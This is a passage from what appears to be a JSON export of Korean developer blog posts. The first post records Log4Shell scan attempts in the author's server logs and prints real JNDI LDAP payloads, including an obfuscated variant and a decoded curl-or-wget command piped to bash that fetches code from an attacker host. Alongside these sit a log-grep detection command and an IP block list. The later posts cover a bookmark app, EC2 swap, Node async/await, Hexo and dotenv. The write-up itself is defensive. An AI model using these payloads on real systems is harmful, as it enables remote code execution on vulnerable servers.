\"${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1LjIwNS4yMzM6NTg3NC8zLjM2LjE1OS4yMDQ6NDQzfHx3Z2V0IC1xIC1PLSA0NS4xNTUuMjA1LjIzMzo1ODc0LzMuMzYuMTU5LjIwNDo0NDMpfGJhc2g=}\"\n\n====\n\nfuck-hack@ip-999-444-999-444:~$ sudo find /var/log/ -type f -exec sh -c \"cat {} | sed -e 's/\\${lower://'g | tr -d '}' | egrep -I -i 'jndi:(ldap[s]?|rmi|dns|nis|iiop|corba|nds|http):'\" \\;\n51.89.237.81 - - [13/Dec/2021:04:28:09 +0900] \"GET /$%7Bjndi:ldap://79.172.214.11:1389/Basic/Command/Base64/Y3VybCAxMzUuMTI1LjIxNy44Ny9qbmRpLnNoIHwgYmFzaA==%7D HTTP/1.0\" 404 162 \"-\" \"mozila\"\n45.83.67.182 - - [13/Dec/2021:12:37:28 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-http80%7D HTTP/1.1\" 404 134 \"${jndi:dns://45.83.64.1/securityscan-http80\" \"${jndi:dns://45.83.64.1/securityscan-http80\"\n45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1\" 302 0 \"${jndi:dns://45.83.64.1/securityscan-https443\" \"${jndi:dns://45.83.64.1/securityscan-https443\"\n45.83.66.117 - - [13/Dec/2021:12:51:02 +0900] \"GET / HTTP/1.1\" 200 7587 \"${jndi:dns://45.83.64.1/securityscan-https443\" \"${jndi:dns://45.83.64.1/securityscan-https443\"\n195.54.160.149 - - [13/Dec/2021:13:45:17 +0900] \"GET /?x=${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo HTTP/1.1\" 200 396 \"${jndi:ldap://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo\" \"${${::-j${::-n${::-d${::-i:${::-l${::-d${::-a${::-p://195.54.160.149:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6NTg3NC8zLjM2LjE1OS4yMDQ6ODB8fHdnZXQgLXEgLU8tIDE5NS41NC4xNjAuMTQ5OjU4NzQvMy4zNi4xNTkuMjA0OjgwKXxiYXNo\"\n167.172.44.255 - - [13/Dec/2021:20:45:05 +0900] \"GET / HTTP/1.0\" 200 612 \"-\" \"borchuk/3.1 ${jndi:ldap://167.172.44.255:389/LegitimateJavaClas\n```\n\n저기서 base64로 인코딩된 부분을 풀어보니\n\n> (curl -s 195.54.160.149:5874/3.36.159.204:80||wget -q -O- 195.54.160.149:5874/3.36.159.204:80)|bash\n\n참고 url 중에 차단 권고에 나온 시도가 많았다.  \n조기에 발견해서 다행인거 같고...정말 침입시도가 무수했다...  \n모두 대응 처리를 해뒀다.\n\n<br>\n\n### 부록 - 래브라도\n\n[래브라도](https://labrador.iotcube.com) 에서 log4j 취약점 점검 도구를 제공하고 있다.  \n그런데 난 사용해도 이상하게 검출이 안되었다;;\n\n사용법은 저기 나와있겠지만...  \n프로젝트 디렉토리를 난 해당 프로젝트의 root 디렉토리로 잡아보고, jar 파일만 있는 곳에서도 해봤는데 검출 결과가 0이었다.  \n그 때 2.11 사용했었는데...  \n아마 user agent를 다른 방식으로 기록해서 그런가...  \n무튼 정 찝찝하면 한번 돌려보는 것도 좋은 방법일듯...\n\n<br>\n\n### 부록 - IP 처리\n\nLG CNS와 talos 글에 나온 ip를 차단하였다.  \n난 저 아이피에 class 대역 차단으로 더 막아뒀다.\n\n171.25.193.0/24  \n185.220.0.0/16\n\n이 두놈이 좀 많았다.\n\n```\n109.237.96.124 1; #log4j attacker\n        185.100.87.202 1;\n        213.164.204.146 1;\n        185.220.101.146 1;\n        171.25.193.20 1;\n        178.17.171.102 1;\n        45.155.205.233 1;\n        171.25.193.25 1;\n        171.25.193.77 1;\n        171.25.193.78 1;\n        182.220.100.242 1;\n        185.220.101.39 1;\n        18.27.197.252 1;\n        89.234.182.139 1;\n        104.244.79.6 1;\n        80.71.158.12 1;\n        45.137.155.55 1;\n        89.249.63.3 1;\n        61.19.25.207 1;\n        195.251.41.139 1;\n        131.100.148.7 1;\n        46.105.95.220 1;\n        170.210.45.163 1;\n        5.157.38.50 1;\n        114.112.161.155 1;\n        221.228.87.37 1;\n        191.232.38.25 1;\n        164.52.53.163 1;\n        45.130.229.168 1;\n        133.130.120.176 1;\n        152.89.239.12 1;\n        163.172.157.143 1;\n        205.185.115.217 1; #log4 attacker\n```\n\n```toc\n\n```\n"},{"excerpt":"개발을 하다보면 쌓이는 링크들... 개발을 하다보면 개발자의 성지 stackoverflow나 다른 사람의 기술 블로그를 많이 보게 된다. 그리고 유용한 것은 즐겨찾기에 저장하거나 페이지 탭에 그대로 두게 된다. 문제는.... 브라우저에서 제공하는 즐겨찾기는 몹시 불편하다. 제한적인 카테고리에 일정 수가 넘어가면 찾는데 어려움의 문제가 기다린다. 두 번째로…","fields":{"slug":"/til/211207-devnote/"},"frontmatter":{"date":"December 07, 2021","title":"21년 12월 7일 연구일지 (with SML (Save My Link) 그냥 즐겨찾기 프로그램 만든 후기)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n## 개발을 하다보면 쌓이는 링크들...\n\n개발을 하다보면 개발자의 성지 stackoverflow나 다른 사람의 기술 블로그를 많이 보게 된다.  \n그리고 유용한 것은 즐겨찾기에 저장하거나 페이지 탭에 그대로 두게 된다.\n\n문제는....  \n브라우저에서 제공하는 즐겨찾기는 몹시 불편하다.  \n제한적인 카테고리에 일정 수가 넘어가면 찾는데 어려움의 문제가 기다린다.\n\n두 번째로 페이지에 그냥 두면...\n\n![](/img_01.png)\n\n<br>\n\n이런 대 참사가 발생한다.\n\n그래서 이번에 노드 공부하다가 빠져버린 일렉트론으로 직접 개발해보기로 했다.  \n일단 1차 개발용 버전은 아래와 같다.\n\n![](/img_02.png)\n\n<br>\n\n이거 개발하면서 JS의 await / async 에 대해서 좀 어느정도 배우게 되었다.  \n나름 학습 효과가 있었던 미니 프로젝트였다.\n\n개발시간은.... [![wakatime](https://wakatime.com/badge/user/eab16459-c51d-412a-8a22-8b9056f6df54/project/e60715d4-f069-4ff9-a53c-33d15c0d0b61.svg)](https://wakatime.com/badge/user/eab16459-c51d-412a-8a22-8b9056f6df54/project/e60715d4-f069-4ff9-a53c-33d15c0d0b61) 이 정도?\n\n근데 저거 벳지 클릭하면 404 나온다...  \n처음 써봤는데 신기하다 ㅎㅎ  \n오늘 기준으로 일주일 동안은 11시간을 쏟았군...\n\n![](/img_03.png)\n\n<br>\n\n솔직히 이야기 하면...  \n낮에 윈도 피시에서 주식창 띄우고 거래 보다가 개발하고...  \n밤에는 유튜브랑 넷플릭스 보면서 하고...  \n좀 더 집중했으면 더 빨리 만들 수 있었지 않을까....(유튭 스타 홍구랑 넷플 지옥, 아케인, 등등...너무 재미있어서 포기 못하겠다...)\n\n무튼 1차는 개인용으로 쓸만하다.\n이걸 좀 UI로 이쁘게 꾸며보고 조금 더 사용성을 높여서 배포해봐야겠다.\n\n이름은 뭐로 할까 하다가....할거 없어서 **SML (Save My Link)** 로 지었다.  \nGithub에 공개 레포는 팠는데...  \n아직 코드는 업뎃 안했다...  \nㄹㅇ 발로짠 코드 + JS 뉴비 스타일 이라서 손 볼게 좀 많다...\n\n![](/img_04.png)\n\n보이는가...main.js에서만 작업한 흔적이...\n\n일단 이거는 그냥 취미로 만든거라서 편의 기능 위주만 추가할 예정이고, 일렉트론에 대한 부분은 업데이트 안할 예정이다.  \n그리고 일렉트론으로 좀 해본 결과 이것도 공부하려면 시간이 걸리고 귀찮아서 더 이상 일렉트론에 학습 시간을 투자하는 행위는 안하려 한다...\n\n그래서 **일단 잘 돌아가면 끝** 이라는 마인드로 개발했다.  \n사실 최종 목표는 Node.js로 작은 웹 서비스랑 연동 처리하는게 목표라서 일렉트론은 이제 **Bye...**\n\n**SML**에 기술적인 내용이랑 관련 문서는 조만간 정리해서 올릴 예정이다.  \n2주전인가 25일날 모빌리티쇼 다녀온거 영상이랑 사진 정리할게 많아서...\n\n혹시 21년 모빌리티쇼에 못가셔서 아쉬운 분은 [개인 유튜브](https://www.youtube.com/watch?v=iY170ga0SJc)에 올렸으니 관심있으신 분은 ㄱㄱ\n\n곧 **SML** 공식 문서 및 배포 소식으로 돌아올 예정...\n"},{"excerpt":"최근 AWS의 EC2 인스턴스가... 현재 베타 테스트로 진행 중인 AWS의 EC2 인스턴스가 자꾸 상태이상 1/2 상태로 되면서 접속이 불가능했었다. 간헐적으로 일어나는걸 보면 뭔가 문제가 좀 심각한 거 같았다. AWS를 잘 쓰는 타입은 아니라서... 클라우드 워치인가 모니터링 툴을 봤는데 CPU 사용률이 갑자기 치솟다가 멈춰 버리는 구간이 보였다. 정…","fields":{"slug":"/aws/211118_aws-ec2-swap/"},"frontmatter":{"date":"November 18, 2021","title":"aws ubuntu에서 swap 메모리 설정하기 (with EC2가 갑자기 상태 이상으로 접속 및 접근 불가)","description":"Ec2에서 메모리가 부족할 때...","tags":["Aws","Ubuntu","Infra"],"series":"Aws","previewImage":"aws_logo.webp","isPrivate":null},"rawMarkdownBody":"\n## 최근 AWS의 EC2 인스턴스가...\n\n현재 베타 테스트로 진행 중인 AWS의 EC2 인스턴스가 자꾸 상태이상 1/2 상태로 되면서 접속이 불가능했었다.  \n간헐적으로 일어나는걸 보면 뭔가 문제가 좀 심각한 거 같았다.\n\nAWS를 잘 쓰는 타입은 아니라서...  \n클라우드 워치인가 모니터링 툴을 봤는데 CPU 사용률이 갑자기 치솟다가 멈춰 버리는 구간이 보였다.\n\n정확히 표현하면 내가 운영하는 서비스에 로그가 기록되는데, 일정 시간 마지막 로그를 보면 그 CPU 사용률이 튄 뒤부터 로그가 끊겼다.  \n그렇다고 내 서비스가 CPU 파워를 엄청 쓰는 것도 아니고...접속률은 베타라서 그렇게 많지 않다.\n\n커널 로그인가에서 메모리 관련 에러를 찾아봤지만 없었다. (근데 메모리가 범인...)\n\n도데체 뭐가 문제인가 하다가 이것저것 검색을 하던 도중 나랑 [비슷한 증상을 가진 글](https://sundries-in-myidea.tistory.com/102) 을 보게 되었다.  \n여기에 나온것과 같이 메모리 문제였다.\n\n**근데 나 같은 경우 위에서 나온 명령어는 동작하지 않았다.**\n\n내 환경은 **Ubuntu 20.04 LTS**였다. (물론 지금 베타테스트 환경은 또 다르다...)\n위 운영체제를 기준으로 작성하겠다.\n\n<br>\n\n### Swap 생성\n\n1. sudo fallocate -l 10G /swapfile\n2. sudo chmod 0600 /swapfile\n3. sudo mkswap /swapfile\n4. sudo swapon /swapfile\n5. free -m\n\n<br>\n\n위 명령어를 풀어서 설명하면...\n\n1.  스왑 파일을 만드는 것 (난 대략 10Gb 정도 잡았다.)\n2.  권한을 준다\n3.  스왑 생성 (처리 결과는 아래 참조)\n\n```\ntest@ip-999-99-999-99:/$ sudo mkswap /swapfile\nmkswap: /swapfile: warning: wiping old swap signature.\nSetting up swapspace version 1, size = 10 GiB (10737414144 bytes)\nno label, UUID=8a30d01e-c3b0-4ccc-bbbb-ada01aaaaac\n```\n\n4.  스왑을 실행\n5.  메모리 할당 확인 (아래 확인 -> 숫자는 임의로 적음 참고만..)\n\n```\n              total        used        free      shared  buff/cache   available\nMem:            968         485          90           0         393         330\nSwap:         10239         260        9979\n```\n\n<br>\n\n만약 뭔가 꼬이거나 스왑을 풀어야 할 경우 다시 아래대로 해준다.\n\n### Swap 해제\n\n1. sudo swapoff -v /swapfile\n2. sudo rm /swapfile\n3. free -m\n\n<br>\n\n보충 설명은 아래...\n\n1. 스왑 해체\n2. 스왑 파일 제거\n3. 스왑이 풀렸는지 확인해본다\n\n<br>\n\n## 정리\n\nEC2가 갑자기 내려가는 경우는 다양한데, 이번처럼 CPU 파워를 막 치고 가다 다운되는게 메모리 부족때문인지는 몰랐다.  \n사실 내가 잘못 로직을 짠게 있나 싶었는데...  \n무튼 이 뒤로 한 4일 갔는데 아직 증상이 나타나진 않고 안정적으로 잘 되고 있다.\n\n찾아보니 스왑은 아무래도 램이 아닌 하드 또는 SSD를 쓰는 거라서 퍼포먼스에서 이슈가 발생할 수 있다.  \n하지만 베타테스트 운영이나 개발 목적으로는 스왑을 써도 충분한거 같다.\n\n나중에는 결국 하드웨어 스팩을 돈으로 올려야 하겠지만 말이다. ㅎㅎ\n\n```toc\n\n```\n"},{"excerpt":"Node.js에서 request를 사용하여... 현재 베타테스트 중인 내 프로젝트의 일부 기능을 Node.js로 변환하는 중이었다. 아직 Node를 학습하면서 붙이는 거라서 좀 익숙하지 않았다. 일단 진행하면서 겪은 문제의 포인트는 아래와 같다. 특정 사이트의 크롤링을 진행한 다음 해당 내역중에 필요한 데이터를 html 파싱 처리. 테스트 환경이 Node…","fields":{"slug":"/node-js/211111_node-async/"},"frontmatter":{"date":"November 11, 2021","title":"Node.js에서 request를 통해 가져온 값을 화면에 뿌릴 때 문제가 생기는 경우 (async, await... 동기/비동기에 대한 간단한 이해)","description":null,"tags":["NodeJS","Troubleshooting"],"series":"NodeJS","previewImage":"nodejs_logo.png","isPrivate":null},"rawMarkdownBody":"\n## Node.js에서 request를 사용하여...\n\n현재 베타테스트 중인 내 프로젝트의 일부 기능을 Node.js로 변환하는 중이었다.  \n아직 Node를 학습하면서 붙이는 거라서 좀 익숙하지 않았다.\n\n일단 진행하면서 겪은 문제의 포인트는 아래와 같다.\n\n> 1. 특정 사이트의 크롤링을 진행한 다음 해당 내역중에 필요한 데이터를 html 파싱 처리.\n> 2. 테스트 환경이 Node.js로 구축한 서버의 특정 url로 접근 시 1번 기능이 호출된다.\n> 3. 문제는 2번에 나온 url 호출을 하면 1번의 작업이 끝나고 그 결과를 json으로 뱉어야 하는데 {} 반환.\n\n난 거의 Java로만 개발을 많이 했던 사람이라 (물론 python도 많이 썼지만 그건 좀 과거라 패스하고...) 순차적인 흐름에 익숙한 사람이다.  \n일단 코드로 보자.\n\n```javascript\n//route에서 크롤링 처리 결과를 가져와서 json으로 응답 처리해주는 함수\nrouter.get('',(req, res, next) => {\n    res.json(crawling4Test());\n});\n\nfunction crawling4Test() {\n  .....\n  return someValue;\n}\n\n```\n\n내 개념으로는 **crawling4Test()** 함수의 처리 결과가 끝나고,  \n그 반환 값을 **res.json()** 에 전달하여 Json 응답이 처리되는 것으로 이해하고 있었다.  \n근데 아니었다.  \n먼저 **crawling4Test()** 함수의 로직도 함께 보자.\n\n```javascript\nfunction crawling4Test() {\n    let targetUrlReq = {\n        url:'https://target_url.com',\n        method: 'GET',\n        timeout: 5000,\n    }\n\n    let resultJson = {};\n\n    request(targetUrlReq, function(err,res,body) {\n            if (!err && res.statusCode === 200) {\n                const enc = charset(res.headers, body)\n                const i_result = iconv.decode(body, enc)\n                const resultHtml = cheerio.load(i_result);\n\n                const regex = /[^0-9]/g;\n                let targetA = resultHtml('div.target_a_tag).text().replace(regex, '');\n                let targetB = resultHtml('div.target_b_tag).text().replace(regex, '');\n\n                //체크용\n                console.log('targetA = ' + targetA)\n                console.log('targetB = ' + targetB)\n\n                resultJson['targetA'] = targetA;\n                resultJson['targetB'] = targetB;\n\n                resolve(resultJson);\n            }\n            else {\n                console.log(`error${res.statusCode}`);\n                resultJson['error'] = 'Some error';\n                reject(resultJson);\n            }\n        });\n\n    return resultJson;\n}\n```\n\n위에서도 언급했지만 저것의 처리 결과는 **{}** 비어있는 딕셔너리 객체였다.  \n(뭐 Map, Key-value 다양한 이름이지만 본문에서는 딕셔너리라 표현)\n\n근데 또 신기한 것은 **crawling4Test()** 함수 안에서 console.log 를 통해 로그를 띄우면 값은 잘 들어있다.  \n내가 원한건 **router.get()** 함수에서 **crawling4Test()** 함수의 처리를 기다리고 응답이 완료되면 **res.json()** 로 결과를 내보내는 **동기적** 처리 방식을 기대했던 것.\n\n그럼 원인은?\n\n> 그냥 함수들이 비 동기로 실행되었다.\n\n이 표현이 맞는지 모르겠지만 무튼 문맥상으로는 저렇게 표현했다.  \n내가 원하는 결과물은 **동기처럼 보이는 순차적 비동기** 뭐 좀 편한 표현으로 **하나의 흐름으로 동작하는 비동기** 였다.\n\n그래서 찾아보니 node에서는 비동기를 하나의 흐름으로 처리하기 위해서는 promise 그리고 await, async 라는게 필요했다.\n\n<br>\n\n## 그래서 promise, await, async 이것들은 대충 감이 오는데...\n\nNode를 공부하는 사람이라면 주요 특징점이나 문제점(?) 같은걸 많이 들었을 것이다.  \n그 중 하나가 **콜백지옥** 이다.\n\n이거는 하도 설명이 많이 나와서 난 패스하겠다.  \n궁금하신 분은 검색하면 다른 블로그나 유튜브에 아주 자세히 설명되어 있으니 그곳을 참고해주시길...\n\n무튼 **promise**와 **await**, **async** 이거 3가지만 잘 조합하면 깔끔하게 처리할 수 있다.  \n(초창기 버전에서는 엄청 복잡했다는데..시간이 지나니 점점 편해지는건 덤...)\n\n**promise**에 대해 설명글 쓰면 또 엄청 길어지니까...간단하게 말하자면..\n\n> “A promise is an object that may produce a single value some time in the future”  \n> 하나의 요청 처리가 끝날때까지 기다리지 않고 다른 요청을 동시에 처리할수 있는 방식 ()\n\n**promise** 소개 문구는 저렇다.\n즉 비동기를 하겠단 이야기인데 콜백의 지옥을 파훼하기 위한 해법이라 하는데 얘도 사실 보면 장황하지 않을 뿐 비슷하다.  \n그래서 **await**, **async** 이거 두 개랑 같이 쓰면 그 때는 어느정도 파훼법이 완성된다.\n\n이번 문제도 같다.  \n그럼 이걸 어떻게 해결했는지 한번 알아보도록 하자\n\n<br>\n\n## 처리한 방법\n\n먼저 변경된 **crawling4Test()** 함수를 보자.\n\n```javascript\nfunction crawling4Test() {\n    let targetUrlReq = {\n        url:'https://target_url.com',\n        method: 'GET',\n        timeout: 5000,\n    }\n\n    return new Promise((resolve, reject) => {\n        let resultJson = {};\n\n        request(targetUrlReq, function(err,res,body) {\n            if (!err && res.statusCode === 200) {\n                const enc = charset(res.headers, body)\n                const i_result = iconv.decode(body, enc)\n                const resultHtml = cheerio.load(i_result);\n\n                const regex = /[^0-9]/g;\n                let targetA = resultHtml('div.target_a_tag).text().replace(regex, '');\n                let targetB = resultHtml('div.target_b_tag).text().replace(regex, '');\n\n                resultJson['targetA'] = targetA;\n                resultJson['targetB'] = targetB;\n\n                resolve(resultJson);\n            }\n            else {\n                resultJson['error'] = 'Some error';\n                reject(resultJson);\n            }\n        });\n    });\n}\n```\n\n일단 반환 값이 json 이 아닌 **Promise**로 바뀌었다.  \n그거 외에는 로직은 같지만 반환의 경우 resolve 와 reject 인데 이거는 어렵지 않다.\n\n해당 값을 다시 또 가공하여 처리하는 함수를 호출해야 하는 경우 then() 으로 체이닝 해서 처리하면 되고, 예외가 생길 경우에도 마찬가지 이다.  \n이 글에서는 **Promise**에 대해 설명하는 공간은 아니기에 간략하게 여기까지만 알아보자.  \n(사실 너무 많은 자료가 많아서...다른 분들꺼 참고하자  \n<하단에 참고로 주렁주렁 달아 놓을 예정>)\n\n이제는 그럼 저 함수를 호출하는 곳으로 가보자\n\n```javascript\nrouter.get(\"\", async (req, res, next) => {\n  res.json(await crawling4Test())\n})\n```\n\n그냥 단어 몇 개가 사이에 박힌거 빼곤 없다.  \n**await** 키워드는 **promise**를 반환하는 함수 앞에 써주고, **async** 키워드는 **await** 선언이 된 곳에 써주면 된다.  \n이것도 여기서는 이렇게만 설명한다.  \n좀 더 자세한 글은...아시죠? ㅎㅎ\n\n그래서 결국 저렇게 처리한 상태로 실행해보면 드디어 원하는 결과가 잘 나오게 된다.\n\n<br>\n\n## 결론 및 여담\n\nNode는 뭔가 자바에서 온 사람을 당황하게(나만 그럴수 있다) 만드는 게 많은듯...  \n저 **promise**, **async**, **await** 에 대해 자세하게 알고 있음 좋을 것 같다.\n\n엄청 딥하게 알면 더 좋겠지만...  \n사실 구현하는데 바쁘니... 어떤 식으로 동작하는지...그리고 어떻게 사용하면 ㅈ 되는지, 어떻게 사용해야 하는지만 알면 될 것 같다.\n\n원리까지 설명하세요 이러는 건 면접에서나 하는거겠지?  \n근데 사실 이런거 면접에서 딥하게 묻는 것도 문제가 있는듯..\n\n위에 언급한 대로 어떻게 사용하는지 정확한 이해도 체크만 하면 되는데 이거 동작 방법을 화이트보드에 설명해보세요 한다?  \n그건 면접자에게 질문을 잘못 던진 케이스 같다.\n\n그런 질문 보다는 이걸 어떻게 썼을 때 잘못된 경우 있었냐? 이걸 어케 대처해야 하냐?  \n이게 옳바른 질문 아닐까? ㅎㅎ\n\n내가 예전에 3년전인가... 면접다닐때...특히 스프링 자바는 진짜 되도 않는 면접 질문 많이 받았다.  \n네이버랑 카카오 전화면접에서는 GC에 대해 다 설명해보고 java8의 GC가 뭐가 틀린지 설명해보랜다...  \n아니 트러블슈팅 성향이나 프로젝트에서 겪은 장애 처리나 어떻게 구현했냐 질문보단 저런걸로...\n\n아마 떨어트리려고 한거 같다는 생각이 많이 든 면접...(아님 내 정신승리일 수도...)\n\n그냥..다시 이런거 찾아보고 공부하다가 옛날 생각나서 주절거려봤다.\n\n### 참고\n\n- [Promise에 대하여](https://mwoo526.tistory.com/35)\n- [자바스크립트 Promise 쉽게 이해하기](https://joshua1988.github.io/web-development/javascript/promise-for-beginners/)\n- [await, async에 대하여](https://joshua1988.github.io/web-development/javascript/js-async-await/#async--await-맛보기)\n\n```toc\n\n```\n"},{"excerpt":"Hexo 설치 글을 보면... 이게 뭐 도움이 될지 모르겠지만... 나는 hexo 설치할 때 npm 이라는거 대충 알았지 자세히는 몰랐다. 그래서 거기 가이드에서 설치할 때 보면 npm install hexo -g 이렇게 글로벌로 설치하게 하는데 이건 내 생각에 좋은 방법은 아닌 것 같다. (나한테는?) 난 보통 어떤 프로젝트나 모듈이 프로젝트 내에서만 …","fields":{"slug":"/tools/211109_local-install-hexo/211109_local-install-hexo/"},"frontmatter":{"date":"November 09, 2021","title":"Hexo를 글로벌이 아닌 로컬에 설치하는 법","description":null,"tags":["Tools","Blog"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n## Hexo 설치 글을 보면...\n\n이게 뭐 도움이 될지 모르겠지만...  \n나는 hexo 설치할 때 npm 이라는거 대충 알았지 자세히는 몰랐다.  \n그래서 거기 가이드에서 설치할 때 보면\n\n> npm install hexo -g\n\n<br>\n\n이렇게 글로벌로 설치하게 하는데 이건 내 생각에 좋은 방법은 아닌 것 같다. (나한테는?)\n\n난 보통 어떤 프로젝트나 모듈이 프로젝트 내에서만 영향을 줘야지 공통으로 사용하는 곳까지 설치되어 거기서 끌어다 쓰는 형식을 안 좋아한다. (정말 싫어한다 -\\_-;;)\n\n그래서 이번에 노드를 학습하면서 이렇게도 관리할 수 있겠구나 싶어서 공유한다.  \n뭐 다 아는 사실이겠지만...  \nhexo 사용할 디렉토리에서 아래의 명령어 대로 설치한다\n\n> npm install hexo\n\n<br>\n\n이렇게 -g 옵션만 빼면 로컬에서 사용할 수 있는데 여기서 한가지 더..  \npath를 등록해줘야 한다.\n\n난 mac 에서 zsh를 사용하기에..  \n자신의 홈 디렉토리에 .zprofile 하나 만들어준다. (만약 있으면 맨 밑에 추가한다)\n\n> PATH=\"\\$PATH:/Users/name/hexo_blog_path/node_modules/.bin\"\n\n당연한 이야기겠지만 위 경로는 자신에게 알맞는 곳을 찾되 **node_modules** 경로를 잡아주는게 포인트다.\n\n위와 같이 추가 후 터미널에서 갱신해주면 끝\n\n> source .zprofile\n\n<br>\n\n### 참고\n\n[Hexo](https://hexo.io/docs/)\n\n```toc\n\n```\n"},{"excerpt":"Node에서 환경 변수를 사용하는 법? (설정 파일로 관리하기) 내가 Spring boot로 개발할 때는 application.yml에 설정을 넣고 개발을 했다. 그러다가 설정에 넣은 값에 변경이 필요할 경우 서버를 내렸다가 올려야 하는 문제가 생겼다. (물론 이중화 되어 있다 하더라도 이렇게 하는건 비효율적..) 그래서 Spring config serv…","fields":{"slug":"/node-js/211109_node-dotenv/"},"frontmatter":{"date":"November 09, 2021","title":"NodeJs에서 환경 변수 또는 설정파일을 이용하여 서버 속성 구성하기","description":null,"tags":["NodeJS"],"series":"NodeJS","previewImage":"nodejs_logo.png","isPrivate":null},"rawMarkdownBody":"\n## Node에서 환경 변수를 사용하는 법? (설정 파일로 관리하기)\n\n내가 Spring boot로 개발할 때는 application.yml에 설정을 넣고 개발을 했다.  \n그러다가 설정에 넣은 값에 변경이 필요할 경우 서버를 내렸다가 올려야 하는 문제가 생겼다.  \n(물론 이중화 되어 있다 하더라도 이렇게 하는건 비효율적..)\n\n그래서 Spring config server를 사용해서 처리하였다.  \nNode.js는 이런 비슷한게 있나 찾아보다가...  \n아주 똑같지 않지만 설정 파일을 외부에 두고 사용할 수 있는 것을 찾았다.  \n(Node를 첨 다뤄보니 이런게 있는줄 몰랐다)\n\n<br>\n\n### dotenv\n\n먼저 설치를 진행한다.  \n(yarn 을 사용하였는데 npm도 똑같다)\n\n> yarn add dotenv\n\n---\n\n### 설정 내용을 선언\n\n설정 파일을 만드는 형태는 두 가지가 있다.\n\n> 여기서는 ES6 문법으로 설명한다. (CommonJS 는 간략하게만 표기..)\n\n### 1. .env 파일 사용\n\n프로젝트 내에 (보통은 자신 프로젝트 루트에) .env 파일을 생성한다  \n그리고 아래와 같이 설정을 기재한다.\n\n```\n#SERVER CONFIG\n\nSERVER_PORT = 3001\nSERVER_NAME = HELLO_SERVER\nSERVER_DIS = 'HELLO_SERVER';\n```\n\n그리고 불러올 js에서는 아래와 같이 사용한다\n\n```javascript\n//CommonJS\n//require(\"dotenv\").config();\n\n//ES6\nimport dotenv from \"dotenv\";\ndotenv.config(); //1 -> config 호출\n\nconst port = process.env.SERVER_PORT;\n\nfunction checkTest() {\n  console.log('SERVER_NAME = '  + process.env.SERVER_NAME);\n  console.log('SERVER_DES = '  + process.env.SERVER_DES);\n}\n...\n```\n\n주의할 점은 **1번** config() 호출 전에 process.env를 사용하면 에러가 난다. (ES6, CommonJS 둘다 동일)  \n그리고 .env 파일의 경로가 다른 곳에 있는 경우 아래와 같이 config 함수를 수정하면 된다.\n\n```javascript\n//CommonJS\n//require(\"dotenv\").config({path:'/your/env/path/.env.dev'});\n\n//ES6\nimport dotenv from \"dotenv\"\ndotenv.config({ path: \"/your/env/path/.env.dev\" })\n```\n\n**단 .env 파일이 존재하는 경우 위 내용은 적용이 안된다. (기존 .env 파일 따라감)**\n\n> 참고로 **SERVER_DIS** 출력해보면 SERVER_DES = 'HELLO SERVER'; 와 같이 따옴표가 같이 출력된다.\n\n```javascript\nconsole.log('SERVER_NAME = '  + typeof process.env.SERVER_NAME);\nconsole.log('SERVER_DES = '  + typeof process.env.SERVER_DES);\n\nconsole.log('SERVER_NAME = '  + process.env.SERVER_NAME);\nconsole.log('SERVER_DES = '  + process.env.SERVER_DES);\n\n///Output\n\nSERVER_NAME = string\nSERVER_NAME = string\n\nSERVER_NAME = HELLO SERVER\nSERVER_DES = 'HELLO SERVER';\n```\n\n---\n\n### 2. config.js 등 js 파일로 사용\n\n이건 **.env** 랑 비슷하지만 사용법은 약간 다른데 먼저 원하는 곳에 config.js 파일을 생성해주고 그곳에 설정을 담는다.\n\n```javascript\nlet configData\n\nconfigData = {\n  SERVER_PORT: 3001,\n}\n\n//ES6 방식\nexport default { configData }\n\n//Common JS 방식\n// module.exports = configData;\n```\n\n그리고 필요한 곳에서 다음과 같이 사용한다.\n\n```javascript\n//ES6\nimport secondConfig  from \"./config.js\"\n\n....\n\nconsole.log('process.env.PORT = ' + secondConfig.configData.SERVER_PORT)\n```\n\n만약 Babel을 사용한 ES6 사용을 한다면 js 확장자는 무시해도 되지만, 미 사용시 .js 확장자를 붙여줘야 한다.\n\n그리고 저기 나온 예제에 있는 export 방식 말고도 여러 방식이 있다.  \n본문 하단의 링크를 참고하자.\n\n### 참고\n\n[Import와 export](https://medium.com/@wonjong_oh/es6에서-import-export-올바르게-이해하고-사용하기-a60acd161051)\n\n```toc\n\n```\n"},{"excerpt":"VSCode로 Node 개발을 진행하다가... 공부 겸 이번 프로젝트에 적용시키려고 Node를 공부하고 예제를 돌려보려던 중... 이상한 점을 발견했다. express를 분명 yarn add express 이렇게 로컬 프로젝트 영역에 설치했음에도 VSCode에서 해당 모듈을 참고하는 곳은 엉뚱한 곳을 가리키고 있었다. 경로가 Mac OS 기준으로.. /U…","fields":{"slug":"/node-js/211109_vscode-nodemodule/"},"frontmatter":{"date":"November 09, 2021","title":"VSCode에서 노드 모듈이 이상한 곳을 가리킬 때.. (.../Library/Caches/typescript/.../node_modules/@types/.....)","description":null,"tags":["NodeJS","Troubleshooting"],"series":"NodeJS","previewImage":"nodejs_logo.png","isPrivate":null},"rawMarkdownBody":"\n## VSCode로 Node 개발을 진행하다가...\n\n공부 겸 이번 프로젝트에 적용시키려고 Node를 공부하고 예제를 돌려보려던 중...  \n이상한 점을 발견했다.\n\n**express**를 분명 **yarn add express** 이렇게 로컬 프로젝트 영역에 설치했음에도 VSCode에서 해당 모듈을 참고하는 곳은 엉뚱한 곳을 가리키고 있었다.\n\n경로가 Mac OS 기준으로..\n\n> 